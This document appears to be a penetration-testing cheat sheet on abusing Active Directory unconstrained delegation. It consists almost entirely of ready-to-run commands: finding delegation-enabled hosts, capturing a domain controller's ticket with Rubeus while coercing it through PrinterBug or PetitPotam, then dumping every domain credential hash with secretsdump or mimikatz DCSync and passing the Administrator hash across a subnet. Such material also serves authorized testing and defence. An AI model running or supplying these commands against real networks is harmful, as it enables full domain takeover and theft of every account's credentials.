---
tags:
  - Foundational
  - Privilege_Escalation
  - Windows
---
## Unconstrained Delegation
resources: [HackTricks Unconstrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation)

### Enumerate Unconstrained Delegation
> [!important] **Requirements:**
> - Compromise of unconstrained delegation machine (non-DC)
> - Ability to coerce DC authentication (**PrinterBug**, **PetitPotam**)
> - Network access to DC (port 88)

> [!info] Machines with unconstrained delegation store the TGT of any user that connects. Compromise the machine + coerce DC authentication = DC's TGT → DCSync.

### BloodHound
```cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```
### [Alternate] PowerView
```powershell
Get-NetComputer -Unconstrained
```

### [Alternate] NetExec
```bash
nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation
```

### [Alternate] Impacket
```bash
findDelegation.py <Domain>/<User>:<Pass> -dc-ip <DC_IP>
```

### [Alternate] Find All Delegation Types
```bash
nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation
```

### [Alternate] nxc_enum
```bash
python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation
```

### [Alternate] Hackles (BloodHound)
```bash
python -m hackles -u neo4j -p '<Neo4jPassword>' --unconstrained
```

### Exploit Unconstrained Delegation
> [!important] **Step 1** - Compromise the unconstrained delegation machine

### Step 2 - Monitor for incoming TGTs
```powershell
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap
```
### Step 3 - Coerce DC to authenticate to compromised host
```powershell
printerbug.py <Domain>/<User>:<Pass>@<DC_IP> <CompromisedHost>
```

```bash
PetitPotam.py <CompromisedHost> <DC_IP>
```

### Step 4 - Use captured DC TGT for DCSync
```bash
export KRB5CCNAME=DC01$.ccache
```

```bash
impacket-secretsdump -k -no-pass <DC_FQDN>
```

### Step 5 - Inject ticket with Rubeus [alternative]
```powershell
.\Rubeus.exe ptt /ticket:<base64_ticket>
```

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:<Domain> /all /csv" "exit"
```

### Validate Extracted Hashes
```bash
nxc smb <DC_IP> -u Administrator -H '<NTLMHash>' -d <Domain>
```

```bash
# Full domain access
nxc smb 192.168.1.0/24 -u Administrator -H '<NTLMHash>' -d <Domain>
```